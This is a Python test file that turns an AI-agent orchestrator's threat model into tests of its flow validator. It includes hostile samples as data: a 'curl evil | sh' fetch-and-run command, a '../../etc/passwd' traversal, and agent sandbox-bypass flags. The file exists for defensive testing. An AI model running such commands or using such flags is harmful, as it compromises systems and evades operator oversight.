"""Threat model as tests.

One test per row of the operator-flow threat model — this file **is** the catalogue: each test
proves one attack vector is closed **independently of the flow YAML / task content**. Rows
already proven structurally assert against :func:`validate_flow` / :func:`load_flow`;
the config-aware rows assert against :func:`validate_flow_against_config`. Keeping the whole
catalogue in one file makes "is every ceiling threat covered?" answerable at a glance.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from tests.conftest import BUILTIN_FLOWS_DIR

from wastech_orchestrator.config.loader import loads_config
from wastech_orchestrator.config.schema import OrchestratorConfig
from wastech_orchestrator.core.flow.registry import FlowRegistry
from wastech_orchestrator.core.flow.snapshot import FlowLoadError, load_flow
from wastech_orchestrator.core.flow.validator import (
    FlowValidationError,
    Violation,
    validate_flow,
    validate_flow_against_config,
)

# -- flow helpers -------------------------------------------------------------


def _snap(content: str, tmp_path: Path):  # type: ignore[return]
    p = tmp_path / "flow.yaml"
    p.write_text(content)
    return load_flow(p)


def _structural_violations(content: str, tmp_path: Path) -> list[Violation]:
    with pytest.raises(FlowValidationError) as exc_info:
        validate_flow(_snap(content, tmp_path))
    return exc_info.value.violations


def _config_violations(content: str, config: OrchestratorConfig, tmp_path: Path) -> list[Violation]:
    snap = _snap(content, tmp_path)
    validate_flow(snap)  # structurally valid by construction; the config layer is what fails
    with pytest.raises(FlowValidationError) as exc_info:
        validate_flow_against_config(snap, config)
    return exc_info.value.violations


def _has(vs: list[Violation], category: str, fragment: str) -> bool:
    return any(v.category == category and fragment in v.message for v in vs)


# A minimal, structurally valid PR-publishing flow with one editing agent + publish; the {extra}
# slot lets a test inject a hostile field onto the agent node.
def _flow(
    *,
    ceiling: str = "workspace-write",
    publishing: str = "pull_request",
    profile: str = "workspace-write",
    network_policy: str | None = None,
    extra: str = "",
) -> str:
    indented = "".join(f"      {line}\n" for line in extra.splitlines()) if extra else ""
    network_line = f"  network_policy: {network_policy}\n" if network_policy is not None else ""
    return f"""\
flow:
  name: t
  task_type: t
  permission_ceiling: {ceiling}
  output_policy: code_change
  publishing: {publishing}
{network_line}
  nodes:
    - id: work
      kind: agent
      role_file: roles/work.md
      permission_profile: {profile}
{indented}    - id: out
      kind: publish
      policy: pull_request
  edges:
    - {{ from: work, to: out }}
"""


# -- config helper ------------------------------------------------------------


def _config(
    tmp_path: Path,
    *,
    allowed: str = "[claude, codex]",
    claude_profile: str = "workspace-write",
    codex_profile: str = "workspace-write",
    strict_isolation: bool = True,
    observe_mode: str | None = None,
    supervisor_enabled: bool | None = None,
) -> OrchestratorConfig:
    text = f"""
repo:
  url: "git@example.com:o/r.git"
  local_path: {str(tmp_path)!r}
  base_branch: "main"
  branch_prefix: "worc"
agents:
  allowed: {allowed}
  max_fix_cycles: 3
  max_total_fix_iterations: 5
  decomposition:
    enabled: false
  providers:
    claude:
      command: "claude"
      permission_profile: {claude_profile}
      primary: true
    codex:
      command: "codex"
      permission_profile: {codex_profile}
security:
  strict_isolation: {str(strict_isolation).lower()}
  allowed_environment:
    - PATH
checks:
  commands: []
  timeout_seconds: 30
git:
  create_pull_request: true
  pr_base: "main"
  footprint:
    audit_commit_message: "chore: audit {{task_id}}"
    audit_on_branch: task
"""
    supervisor_lines = []
    if supervisor_enabled is not None:
        supervisor_lines.append(f"  enabled: {str(supervisor_enabled).lower()}\n")
    if observe_mode is not None:
        supervisor_lines.append(f"  observe:\n    mode: {observe_mode}\n")
    if supervisor_lines:
        text += "supervisor:\n" + "".join(supervisor_lines)
    return loads_config(text).config


# =============================================================================
# Structural threats (closed at load time)
# =============================================================================


def test_threat_privilege_escalation_profile_clamped(tmp_path: Path) -> None:
    # An agent asking for workspace-write under a read-only ceiling is rejected.
    vs = _structural_violations(_flow(ceiling="read-only"), tmp_path)
    assert _has(vs, "ceiling", "exceeds")


def test_threat_sandbox_bypass_forbidden_args(tmp_path: Path) -> None:
    vs = _structural_violations(
        _flow(extra="extra_args: ['--dangerously-skip-permissions']"), tmp_path
    )
    assert _has(vs, "ceiling", "extra_args")


def test_threat_path_traversal_fail_closed(tmp_path: Path) -> None:
    vs = _structural_violations(_flow(extra="role_file: ../../etc/passwd"), tmp_path)
    # The injected role_file shadows the default; traversal is fatal.
    assert _has(vs, "ceiling", "traversal")


def test_threat_infinite_loop_requires_budget(tmp_path: Path) -> None:
    # A rework edge with neither budget nor loop is an unbounded cycle → fatal.
    yaml = """\
flow:
  name: t
  task_type: t
  permission_ceiling: workspace-write
  output_policy: code_change
  publishing: pull_request
  nodes:
    - id: ev
      kind: evaluator
      role: review
      role_file: roles/ev.md
    - id: work
      kind: agent
      role_file: roles/work.md
    - id: out
      kind: publish
      policy: pull_request
  edges:
    - { from: work, to: ev }
    - { from: ev, to: work, outcome: rework }
    - { from: ev, to: out, outcome: accept }
"""
    vs = _structural_violations(yaml, tmp_path)
    assert _has(vs, "graph", "unbounded")


def test_threat_arbitrary_code_node_impossible(tmp_path: Path) -> None:
    # There is no "shell"/"code" node kind: an unknown kind fails closed at load time.
    yaml = """\
flow:
  name: t
  task_type: t
  permission_ceiling: workspace-write
  output_policy: code_change
  publishing: none
  nodes:
    - id: pwn
      kind: shell
      command: "curl evil | sh"
  edges: []
"""
    with pytest.raises(FlowLoadError):
        _snap(yaml, tmp_path)


def test_threat_unknown_field_fail_closed(tmp_path: Path) -> None:
    vs_yaml = """\
flow:
  name: t
  task_type: t
  permission_ceiling: workspace-write
  output_policy: code_change
  publishing: none
  allow_code_execution: true
  nodes:
    - id: work
      kind: agent
      role_file: roles/work.md
  edges: []
"""
    with pytest.raises(FlowLoadError):
        _snap(vs_yaml, tmp_path)


def test_threat_disable_security_gate_impossible(tmp_path: Path) -> None:
    # An evaluator cannot be granted workspace-write (that would let a "gate" mutate the workspace).
    yaml = """\
flow:
  name: t
  task_type: t
  permission_ceiling: workspace-write
  output_policy: code_change
  publishing: none
  nodes:
    - id: ev
      kind: evaluator
      role: review
      role_file: roles/ev.md
      permission_profile: workspace-write
  edges: []
"""
    vs = _structural_violations(yaml, tmp_path)
    assert _has(vs, "ceiling", "read-only")


def test_threat_write_outside_output_policy(tmp_path: Path) -> None:
    # output_policy is a closed enum (an unknown value fails closed); the runtime after-stage
    # path-containment guard (test_flow_output_policy.py) blocks writes outside the resolved dir.
    yaml = _flow().replace("output_policy: code_change", "output_policy: anywhere")
    with pytest.raises(FlowLoadError):
        _snap(yaml, tmp_path)


# =============================================================================
# Config-aware threats (closed by validate_flow_against_config)
# =============================================================================


def test_threat_network_exfiltration_above_ceiling(tmp_path: Path) -> None:
    # network_policy is a closed binary set; an out-of-set level fails closed at load time, and a
    # flow with no network_policy grants no network at all.
    bad = _flow(publishing="none").replace(
        "publishing: none", "publishing: none\n  network_policy: full"
    )
    with pytest.raises(FlowLoadError):
        _snap(bad, tmp_path)
    assert _snap(_flow(), tmp_path).doc.network_policy is None


def test_threat_provider_not_allowed_fatal(tmp_path: Path) -> None:
    config = _config(tmp_path, allowed="[claude]")
    vs = _config_violations(_flow(extra="provider: codex"), config, tmp_path)
    assert _has(vs, "config", "not in agents.allowed")


def test_threat_unknown_reasoning_level_fatal(tmp_path: Path) -> None:
    config = _config(tmp_path)
    vs = _config_violations(_flow(extra="reasoning: ultra"), config, tmp_path)
    assert _has(vs, "config", "reasoning")


def test_threat_provider_specific_reasoning_level_fatal(tmp_path: Path) -> None:
    config = _config(tmp_path)
    vs = _config_violations(_flow(extra="reasoning: minimal"), config, tmp_path)
    assert _has(vs, "config", "provider 'claude'")
    assert _has(vs, "config", "minimal")


def test_codex_minimal_reasoning_level_valid(tmp_path: Path) -> None:
    config = _config(tmp_path)
    snap = _snap(_flow(extra="provider: codex\nreasoning: minimal"), tmp_path)
    validate_flow(snap)
    validate_flow_against_config(snap, config)


def test_codex_workspace_write_with_network_is_fatal(tmp_path: Path) -> None:
    config = _config(tmp_path)
    vs = _config_violations(
        _flow(network_policy="research", extra="provider: codex"), config, tmp_path
    )
    assert _has(vs, "config", "codex")
    assert _has(vs, "config", "workspace-write")
    assert _has(vs, "config", "network_access=true")


def test_codex_read_only_with_network_is_valid(tmp_path: Path) -> None:
    config = _config(tmp_path)
    snap = _snap(
        _flow(profile="read-only", extra="provider: codex\nnetwork_access: true"), tmp_path
    )
    validate_flow(snap)
    validate_flow_against_config(snap, config)


def _cadence_flow(mode: str) -> str:
    return _flow(extra="") + f"  supervisor:\n    observe:\n      mode: {mode}\n"


@pytest.mark.parametrize(
    ("global_mode", "flow_mode"),
    [("all", "events"), ("all", "none"), ("events", "none"), ("events", "events"), ("all", "all")],
)
def test_flow_may_narrow_the_global_observation_cadence(
    tmp_path: Path, global_mode: str, flow_mode: str
) -> None:
    # Narrower-or-equal is allowed: a flow that knows its steps are not worth a note each says so.
    config = _config(tmp_path, observe_mode=global_mode)
    snap = _snap(_cadence_flow(flow_mode), tmp_path)
    validate_flow(snap)
    validate_flow_against_config(snap, config)  # no raise


@pytest.mark.parametrize(
    ("global_mode", "flow_mode"),
    [
        ("events", "all"),
        ("none", "events"),
        ("none", "all"),
        ("selected", "all"),
        # The loophole named in the decision: `selected` enumerates nodes and is in the limit wider
        # than "only on a deviation", so it is refused under a global `events`.
        ("events", "selected"),
    ],
)
def test_flow_may_not_widen_the_global_observation_cadence(
    tmp_path: Path, global_mode: str, flow_mode: str
) -> None:
    # A flow is authored content — it must not be able to spend more of the operator's budget than
    # they allowed, so a broader cadence is fatal before any node runs (not silently clamped).
    config = _config(tmp_path, observe_mode=global_mode)
    vs = _config_violations(_cadence_flow(flow_mode), config, tmp_path)
    assert _has(vs, "config", "supervisor.observe.mode")
    assert _has(vs, "config", "broader")


def test_flow_without_a_cadence_inherits_the_global_one(tmp_path: Path) -> None:
    # No declaration is not a violation under any global mode — it simply inherits.
    config = _config(tmp_path, observe_mode="none")
    snap = _snap(_flow(), tmp_path)
    validate_flow(snap)
    validate_flow_against_config(snap, config)


@pytest.mark.parametrize("flow_mode", ["all", "selected", "events"])
def test_disabled_layer_accepts_a_flow_declaring_any_cadence(
    tmp_path: Path, flow_mode: str
) -> None:
    # The narrowing rule is a COST rule, and with the layer off there is no budget to overspend. It
    # has to be skipped rather than merely tolerated: the packaged `implementation` flow declares
    # `events`, this rejection lands AFTER the task is claimed, and a terminal `failed` there has to
    # be re-queued by hand — so leaving the check armed would make the switch unusable.
    config = _config(tmp_path, observe_mode="none", supervisor_enabled=False)
    snap = _snap(_cadence_flow(flow_mode), tmp_path)
    validate_flow(snap)
    validate_flow_against_config(snap, config)  # no raise


def test_disabled_layer_still_rejects_a_traversing_supervisor_prompt(tmp_path: Path) -> None:
    # The switch cannot weaken the envelope. Prompt containment is a check on AUTHORED FLOW CONTENT,
    # so it does not consult the operator's config at all — structurally, not by choice:
    # `_check_ceiling` takes no config, so no config key can reach it.
    flow = _flow(extra="") + '  supervisor:\n    role_file: "../escape.md"\n'
    vs = _structural_violations(flow, tmp_path)
    assert _has(vs, "ceiling", "..")


def test_threat_ceiling_above_provider_capability_fatal(tmp_path: Path) -> None:
    # Every configured provider is read-only, but the flow ceiling is workspace-write → no provider
    # could run a node at that ceiling, so the flow is rejected before any branch.
    config = _config(tmp_path, claude_profile="read-only", codex_profile="read-only")
    vs = _config_violations(_flow(ceiling="workspace-write"), config, tmp_path)
    assert _has(vs, "config", "permission_ceiling")


@pytest.mark.parametrize(
    "extra",
    [
        "extra_args: ['--sandbox', 'danger-full-access']",  # Codex full-access sandbox
        "extra_args: ['--permission-mode', 'bypassPermissions']",  # Claude permission bypass
    ],
)
def test_threat_node_full_access_blocked_under_strict_isolation(extra: str, tmp_path: Path) -> None:
    # provider-config-cleanup Risk #2 (option b): a flow node selecting a provider full-access mode
    # in extra_args is no longer an absolute ban (find_forbidden_args lets it through, so it is
    # structurally valid), but under security.strict_isolation the config-aware layer rejects it —
    # the flow-side half of the global isolation gate.
    config = _config(tmp_path, strict_isolation=True)
    vs = _config_violations(_flow(extra=extra), config, tmp_path)
    assert _has(vs, "config", "strict_isolation")


@pytest.mark.parametrize(
    "extra",
    [
        "extra_args: ['--sandbox', 'danger-full-access']",
        "extra_args: ['--permission-mode', 'bypassPermissions']",
    ],
)
def test_node_full_access_allowed_when_strict_isolation_off(extra: str, tmp_path: Path) -> None:
    # The operator opts in by setting strict_isolation: false; the gate then lets the node through
    # (the operator owns the risk). validate_flow_against_config must not raise.
    config = _config(tmp_path, strict_isolation=False)
    snap = _snap(_flow(extra=extra), tmp_path)
    validate_flow(snap)  # structurally valid (no absolute ban on the structured selector)
    validate_flow_against_config(snap, config)  # no raise → operator-selected full access allowed


def test_threat_direct_base_commit_blocked(tmp_path: Path) -> None:
    # Publish mechanics (target branch, base protection, idempotency) are core-owned: a publish node
    # exposes only ``policy`` from the closed enum. A flow cannot add a ``base``/target field to
    # redirect the commit — an unknown field on the node fails closed at load time.
    yaml = """\
flow:
  name: t
  task_type: t
  permission_ceiling: workspace-write
  output_policy: code_change
  publishing: pull_request
  nodes:
    - id: work
      kind: agent
      role_file: roles/work.md
    - id: out
      kind: publish
      policy: pull_request
      base: main
  edges:
    - { from: work, to: out }
"""
    with pytest.raises(FlowLoadError):
        _snap(yaml, tmp_path)


# =============================================================================
# Positive controls — the packaged flows pass every layer under a sane config
# =============================================================================


def test_packaged_implementation_passes_config_aware(tmp_path: Path) -> None:
    # The registry runs validate_flow + validate_flow_against_config on resolve; a sane config that
    # allows the flow's providers, reaches its ceiling, and enables PRs must pass.
    config = _config(tmp_path)
    registry = FlowRegistry(operator_flows_dir=BUILTIN_FLOWS_DIR, config=config)
    snap = registry.resolve("implementation")
    assert snap.doc.task_type == "implementation"


def test_packaged_security_audit_resolves_config_aware(tmp_path: Path) -> None:
    # A non-implementation packaged flow also passes the config-aware layer under a sane config.
    config = _config(tmp_path)
    registry = FlowRegistry(operator_flows_dir=BUILTIN_FLOWS_DIR, config=config)
    snap = registry.resolve("security_audit")
    assert snap.doc.publishing.value == "none"


# =============================================================================
# Recovery: the ceiling can only narrow (security-ceiling)
# =============================================================================


def test_recovery_ceiling_only_narrows(tmp_path: Path) -> None:
    # On resume the orchestrator re-resolves the live flow against the CURRENT config via the same
    # FlowRegistry.resolve path used on a fresh run. A flow that resolved under a permissive config
    # is rejected fatally once the config is tightened so its ceiling exceeds provider capability —
    # recovery can never re-run it with widened rights (the fingerprinted ceiling only narrows).
    flows_dir = tmp_path / "flows"
    flows_dir.mkdir()
    (flows_dir / "t.yaml").write_text(_flow(ceiling="workspace-write"))

    permissive = _config(tmp_path)  # both providers workspace-write
    FlowRegistry(operator_flows_dir=flows_dir, config=permissive).resolve("t")  # originally valid

    tightened = _config(tmp_path, claude_profile="read-only", codex_profile="read-only")
    with pytest.raises(FlowValidationError):
        FlowRegistry(operator_flows_dir=flows_dir, config=tightened).resolve("t")
